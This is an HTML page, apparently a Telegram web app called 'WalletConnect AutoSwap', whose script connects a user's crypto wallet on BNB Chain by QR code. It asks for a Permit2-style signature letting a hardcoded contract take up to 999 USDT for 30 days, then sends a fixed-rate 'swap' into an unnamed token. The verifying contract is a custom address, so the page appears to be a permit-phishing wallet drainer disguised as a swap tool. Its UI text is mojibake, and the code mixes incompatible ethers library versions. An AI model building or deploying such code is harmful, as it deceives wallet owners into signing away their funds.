<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WalletConnect AutoSwap</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg,#1a1f2d,#0d1520);
      color:#e0e0e0; text-align:center; margin:0; padding:20px;
    }
    .container {
      max-width:500px; margin:0 auto; padding:30px;
      background:rgba(30,40,55,0.8); border-radius:20px;
      box-shadow:0 10px 40px rgba(0,0,0,0.4);
    }
    canvas { display:block; margin:20px auto; }
    #status {
      margin-top:20px; font-size:16px; min-height:40px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ WalletConnect AutoSwap</h1>
    <canvas id="qrcode"></canvas>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
  </div>

  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <script type="module">
    // üîß –ü–æ–ª–∏—Ñ–∏–ª–ª: —Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏—è BigInt –≤ JSON.stringify
    BigInt.prototype.toJSON = function() { return this.toString(); }; // 

    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';

    const statusEl = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");
    const setStatus = (msg, color="#4fc3f7") => {
      statusEl.textContent = msg;
      statusEl.style.color = color;
    };

    async function runApp() {
      try {
        setStatus("‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");
        const client = await SignClient.init({
          projectId: "d868f90cd734355ae0320f8f0258b6b1",
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap",
            description: "Permit2 ‚Üí AutoSwap",
            url: location.href,
            icons: ["https://walletconnect.com/favicon.ico"]
          }
        });

        setStatus("üîó –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏ –∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è QR-–∫–æ–¥–∞...");
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              chains: ["eip155:56"],
              methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
              events: ["chainChanged", "accountsChanged"]
            }
          }
        });

        if (uri) {
          QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
          setStatus("üì± –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –≤ –≤–∞—à–µ–º –∫–æ—à–µ–ª—å–∫–µ");
        }

        const session = await approval();
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${address}`, "#66bb6a");

        const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org");
        const permit2 = ethers.getAddress("0x7679bcfa8cc6f6094fa1c6cb8e6962287e5ca3d4");
        const autoswap = ethers.getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");
        const tokenIn  = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
        const tokenOut = ethers.getAddress("0xa511768003d01eaa0f464feeea4b1cddc4254b4f");
        const limit = ethers.parseUnits("999", 18);
        const rateScaled = ethers.parseUnits("0.024", 18);

        setStatus("‚åõ –ü–æ–ª—É—á–∞–µ–º nonce –∏–∑ Permit2...");
        const pt2 = new ethers.Contract(permit2,
          ["function allowanceNonces(address,address,address) view returns (uint48)"],
          provider
        );
        const nonce = await pt2.allowanceNonces(address, autoswap, tokenIn);

        const now = Math.floor(Date.now() / 1000);
        const deadline = now + 30 * 24 * 3600;
        const domain = { name:"Permit2", chainId:56, verifyingContract:permit2 };
        const types = {
          PermitTransferFrom:[
            { name:"permitted", type:"TokenPermissions" },
            { name:"spender", type:"address" },
            { name:"nonce", type:"uint256" },
            { name:"deadline", type:"uint256" }
          ],
          TokenPermissions:[
            { name:"token", type:"address" },
            { name:"amount", type:"uint256" }
          ]
        };
        const message = { permitted:{token:tokenIn,amount:limit}, spender:autoswap, nonce, deadline };

        setStatus("‚úçÔ∏è –ó–∞–ø—Ä–æ—Å EIP‚Äë712 –ø–æ–¥–ø–∏—Å–∏ Permit2...");
        let signature;
        try {
          signature = await client.request({
            topic: session.topic,
            chainId: "eip155:56",
            request: {
              method: "eth_signTypedData_v4",
              params: [address, JSON.stringify({ types, domain, primaryType:"PermitTransferFrom", message })]
            }
          });
        } catch (err) {
          console.error("–û—à–∏–±–∫–∞ –ø–æ–¥–ø–∏—Å–∏:", err);
          if (err.code === 4001) {
            setStatus("‚ùå –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º", "#ff6b6b");
          } else {
            setStatus("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–ø–∏—Å–∞—Ç—å Permit2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π –∫–æ—à–µ–ª—ë–∫", "#ff6b6b");
          }
          return;
        }

        setStatus("üîÑ –û—Ç–ø—Ä–∞–≤–∫–∞ swap —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...");
        const swapIface = new ethers.utils.Interface([
          "function swapForUser(address user,address tokenIn,uint256 amount,uint256 nonce,uint256 deadline,address tokenOut,uint256 rate,bytes signature)"
        ]);
        const data = swapIface.encodeFunctionData("swapForUser", [
          address, tokenIn, limit, nonce, deadline, tokenOut, rateScaled, signature
        ]);

        const txHash = await client.request({
          topic: session.topic,
          chainId: "eip155:56",
          request: {
            method: "eth_sendTransaction",
            params: [{ from: address, to: autoswap, data }]
          }
        });

        setStatus(`‚úÖ Swap –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!\n${txHash}`, "#66bb6a");
      } catch (e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.reason || e.message}`, "#ff6b6b");
      }
    }

    runApp();
  </script>
</body>
</html>
